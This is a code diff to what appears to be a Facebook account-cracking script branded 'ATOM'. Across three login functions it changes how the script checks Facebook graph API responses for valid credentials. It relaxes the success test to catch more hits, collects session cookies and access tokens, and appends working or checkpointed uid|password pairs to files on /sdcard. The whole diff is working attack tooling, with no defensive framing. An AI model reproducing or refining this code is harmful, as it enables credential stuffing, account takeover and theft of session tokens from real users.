@@ -1394,7 +1394,7 @@ def mbasic(uid,pwx,tl):
             encode = urllib.parse.urlencode(data, doseq=True)
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://graph.facebook.com/graphql', data=encode)
-            if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -1409,9 +1409,14 @@ def mbasic(uid,pwx,tl):
                     return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
@@ -1471,7 +1476,7 @@ def p(uid,pwx,tl):
             }
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
-            if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -1486,9 +1491,14 @@ def p(uid,pwx,tl):
                     return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
@@ -1605,7 +1615,7 @@ def x(uid,pwx,tl):
                 "client_trace_id": str(uuid.uuid4()),
             }
             response = Session.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
-            if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -1620,9 +1630,14 @@ def x(uid,pwx,tl):
                     return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
